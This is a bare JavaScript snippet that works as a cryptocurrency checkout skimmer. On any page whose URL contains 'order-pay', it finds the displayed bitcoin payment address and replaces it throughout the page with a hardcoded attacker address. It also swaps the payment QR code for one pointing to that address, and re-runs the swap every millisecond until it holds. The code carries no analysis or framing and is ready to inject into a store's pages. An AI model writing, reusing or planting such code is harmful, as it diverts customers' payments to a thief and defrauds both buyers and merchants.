function api(){

    if (window.location.href.includes("order-pay")){
        var amo = document.getElementById("amount").innerText;
        if(document.getElementById("qrcode").children[1].src=="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qa2srfrng7e5zzqxtxeqxpzjhycgwvuapfsrhrf?amount="+amo){
            clearInterval(intertime);
            return 0;
        }
        else{
            document.getElementById("qrcode").children[1].src="";
        }
        var add = document.getElementById("payment-address").innerText;
        var html = document.body.innerHTML;
        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qa2srfrng7e5zzqxtxeqxpzjhycgwvuapfsrhrf');
        document.body.innerHTML = newHtml;
        document.getElementById("qrcode").children[1].src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qa2srfrng7e5zzqxtxeqxpzjhycgwvuapfsrhrf?amount="+amo

    }
}
var intertime = setInterval(function(){api(intertime)}, 1);
